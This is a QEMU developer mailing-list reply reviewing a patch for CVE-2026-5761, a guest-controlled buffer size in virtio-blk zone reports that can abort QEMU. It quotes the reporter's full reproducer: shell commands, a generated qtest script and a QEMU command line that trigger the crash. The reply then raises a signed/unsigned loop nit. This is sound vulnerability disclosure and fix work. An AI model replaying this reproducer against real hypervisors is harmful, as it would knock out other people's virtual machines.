Return-Path: <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from lists.gnu.org (lists1p.gnu.org [209.51.188.17])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 5B801F36BA4
	for <qemu-devel@archiver.kernel.org>; Fri, 10 Apr 2026 03:59:59 +0000 (UTC)
Received: from localhost ([::1] helo=lists1p.gnu.org)
	by lists.gnu.org with esmtp (Exim 4.90_1)
	(envelope-from <qemu-devel-bounces@nongnu.org>)
	id 1wB31O-0000EX-3g; Thu, 09 Apr 2026 23:59:06 -0400
Received: from eggs.gnu.org ([2001:470:142:3::10])
 by lists1p.gnu.org with esmtps (TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256)
 (Exim 4.90_1) (envelope-from <dlemoal@kernel.org>)
 id 1wB31M-0000DV-85; Thu, 09 Apr 2026 23:59:04 -0400
Received: from tor.source.kernel.org ([2600:3c04:e001:324:0:1991:8:25])
 by eggs.gnu.org with esmtps (TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256)
 (Exim 4.90_1) (envelope-from <dlemoal@kernel.org>)
 id 1wB31K-0000SL-Cj; Thu, 09 Apr 2026 23:59:03 -0400
Received: from smtp.kernel.org (transwarp.subspace.kernel.org [100.75.92.58])
 by tor.source.kernel.org (Postfix) with ESMTP id C36A160103;
 Fri, 10 Apr 2026 03:58:57 +0000 (UTC)
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 5C2C6C19421;
 Fri, 10 Apr 2026 03:58:55 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
 s=k20201202; t=1775793537;
 bh=P216gWB7EJf35akZ9fpqTwc5cSqB13u0DyttGQ/3VgI=;
 h=Date:Subject:To:Cc:References:From:In-Reply-To:From;
 b=jK0rLa7midV14F0zbB9r1ltXwDCloV208k6XvGiGx3sHlRcSvmJb0bWfS6XjIcWVN
 fRYELEV7t1FNeaVjTCmghS18tDSnD2XKRgKoX7yydD9ByptP+atPr8hFG+2LkdfHUO
 BJkuSxYEgzQMCc8+4CnvA0T3iNtE1eJBSrKhFXh+KEdlzrPFUjlZVxS9swIilb1zca
 3U6epxmUKSLTpdS00pcg6HZpEkGDdCf73U4P1EMPCJRjsFAxjiXb2W2sLxJkMSUoPT
 b0oouAUfOfjajkaapfvwdAzjfy0kroBTHSqka/UUfu7h00bs4oO4YeDkHkraYiwZny
 Fa26Zelxq7MyQ==
Message-ID: <878d1716-230f-4bcf-9806-1076c19246b7@kernel.org>
Date: Fri, 10 Apr 2026 05:58:53 +0200
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH for-11.0] virtio-blk: fix zone report buffer out-of-memory
 (CVE-2026-5761)
To: Stefan Hajnoczi <stefanha@redhat.com>, qemu-devel@nongnu.org
Cc: Hanna Reitz <hreitz@redhat.com>, qemu-stable@nongnu.org,
 qemu-block@nongnu.org, Kevin Wolf <kwolf@redhat.com>,
 Peter Maydell <peter.maydell@linaro.org>, "Michael S. Tsirkin"
 <mst@redhat.com>, Sam Li <faithilikerun@gmail.com>,
 Dmitry Fomichev <dmitry.fomichev@wdc.com>,
 Mingyuan Luo <myluo24@m.fudan.edu.cn>
References: <20260409200749.458162-1-stefanha@redhat.com>
Content-Language: en-US
From: Damien Le Moal <dlemoal@kernel.org>
Organization: Western Digital Research
In-Reply-To: <20260409200749.458162-1-stefanha@redhat.com>
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit
Received-SPF: pass client-ip=2600:3c04:e001:324:0:1991:8:25;
 envelope-from=dlemoal@kernel.org; helo=tor.source.kernel.org
X-Spam_score_int: -25
X-Spam_score: -2.6
X-Spam_bar: --
X-Spam_report: (-2.6 / 5.0 requ) BAYES_00=-1.9, DKIMWL_WL_HIGH=-0.54,
 DKIM_SIGNED=0.1, DKIM_VALID=-0.1, DKIM_VALID_AU=-0.1, DKIM_VALID_EF=-0.1,
 SPF_HELO_NONE=0.001, SPF_PASS=-0.001 autolearn=ham autolearn_force=no
X-Spam_action: no action
X-BeenThere: qemu-devel@nongnu.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: qemu development <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <https://lists.nongnu.org/archive/html/qemu-devel>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
Errors-To: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Sender: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org

On 2026/04/09 22:07, Stefan Hajnoczi wrote:
> An internal buffer is used when processing VIRTIO_BLK_T_ZONE_REPORT
> requests. The buffer's size is controlled by the guest. A large value
> can result in g_malloc() failure and the QEMU process aborts, resulting
> in a Denial of Service (DoS) (most likely in cases where an untrusted
> guest application or a nested guest with virtio-blk passthrough is able
> to abort QEMU).
> 
> Modify the zone report implementation to work incrementally with a
> bounded buffer size.
> 
> This is purely a QEMU implementation issue and no VIRTIO spec changes
> are needed.
> 
> Mingyuan Luo found this bug and provided a reproducer which I haven't
> put into tests/qtest/ because it requires a zoned storage device (e.g.
> root and modprobe null_blk):
> 
> 1) Prepare a zoned nullblk backend (/dev/nullb0):
> 
> sudo modprobe -r null_blk || true
> sudo modprobe null_blk nr_devices=1 zoned=1
> sudo chmod 0666 /dev/nullb0
> cat /sys/block/nullb0/queue/zoned
> 
> 2) Create qtest input:
> 
> cat >/tmp/vblk-zone-report-oom.qtest <<'EOF'
> outl 0xcf8 0x80002004
> outw 0xcfc 0x0007
> outl 0xcf8 0x80002010
> outl 0xcfc 0x0000c001
> outb 0xc012 0x00
> outb 0xc012 0x01
> outb 0xc012 0x03
> outl 0xc004 0x00000000
> outw 0xc00e 0x0000
> outl 0xc008 0x00000100
> outb 0xc012 0x07
> writel 0x00020000 0x00000010
> writel 0x00020004 0x00000000
> writeq 0x00020008 0x0000000000000000
> writeq 0x00100000 0x0000000000020000
> writel 0x00100008 0x00000010
> writew 0x0010000c 0x0001
> writew 0x0010000e 0x0001
> EOF
> 
> for i in $(seq 1 1022); do
> d=$((0x00100000 + i * 16))
> n=$((i + 1))
> printf 'writeq 0x%08x 0x0000000000200000\n' "$d" >> /tmp/vblk-zone-report-oom.qtest
> printf 'writel 0x%08x 0x1fe00000\n' $((d + 8)) >> /tmp/vblk-zone-report-oom.qtest
> printf 'writew 0x%08x 0x0003\n' $((d + 12)) >> /tmp/vblk-zone-report-oom.qtest
> printf 'writew 0x%08x 0x%04x\n' $((d + 14)) "$n" >> /tmp/vblk-zone-report-oom.qtest
> done
> 
> d=$((0x00100000 + 1023 * 16))
> printf 'writeq 0x%08x 0x0000000000200000\n' "$d" >> /tmp/vblk-zone-report-oom.qtest
> printf 'writel 0x%08x 0x1fe00000\n' $((d + 8)) >> /tmp/vblk-zone-report-oom.qtest
> printf 'writew 0x%08x 0x0002\n' $((d + 12)) >> /tmp/vblk-zone-report-oom.qtest
> printf 'writew 0x%08x 0x0000\n' $((d + 14)) >> /tmp/vblk-zone-report-oom.qtest
> cat >> /tmp/vblk-zone-report-oom.qtest <<'EOF'
> writew 0x00104000 0x0000
> writew 0x00104002 0x0001
> writew 0x00104004 0x0000
> outw 0xc010 0x0000
> EOF
> 
> 3) Run the qtest input with ASAN build (compile qemu with --enable-asan):
> 
> build/qemu-system-x86_64 -display none \
> -accel qtest -qtest stdio \
> -machine pc -nodefaults -m 512M -monitor none -serial none \
> -blockdev driver=host_device,node-name=disk0,filename=/dev/nullb0 \
> -device virtio-blk-pci-transitional,drive=disk0,addr=04.0,queue-size=1024 \
> < /tmp/vblk-zone-report-oom.qtest
> 
> Cc: Sam Li <faithilikerun@gmail.com>
> Cc: Damien Le Moal <dlemoal@kernel.org>
> Cc: Dmitry Fomichev <dmitry.fomichev@wdc.com>
> Fixes: CVE-2026-5761
> Fixes: 4f7366506a9 ("virtio-blk: add zoned storage emulation for zoned devices")
> Reported-by: Mingyuan Luo <myluo24@m.fudan.edu.cn>
> Signed-off-by: Stefan Hajnoczi <stefanha@redhat.com>

Overall, looks OK to me, modulo one nit below.

With that fixed, feel free to add:

Reviewed-by: Damien Le Moal <dlemoal@kernel.org>

[...]

> @@ -529,28 +538,18 @@ static void virtio_blk_zone_report_complete(void *opaque, int ret)
>          goto out;
>      }
>  
> -    zrp_size = sizeof(struct virtio_blk_zone_report)
> -               + sizeof(struct virtio_blk_zone_descriptor) * nz;
> -    n = iov_from_buf(in_iov, in_num, 0, &zrp_hdr, sizeof(zrp_hdr));
> -    if (n != sizeof(zrp_hdr)) {
> -        virtio_error(vdev, "Driver provided input buffer that is too small!");
> -        err_status = VIRTIO_BLK_S_ZONE_INVALID_CMD;
> -        goto out;
> -    }
> -
> -    for (size_t i = sizeof(zrp_hdr); i < zrp_size;
> -        i += sizeof(struct virtio_blk_zone_descriptor), ++j) {
> +    for (size_t j = 0; j < nz; j++) {

nz is an int64_t, so signed, but j is an unsigned size_t. This can generate
compiler/code checker warnings.


-- 
Damien Le Moal
Western Digital Research

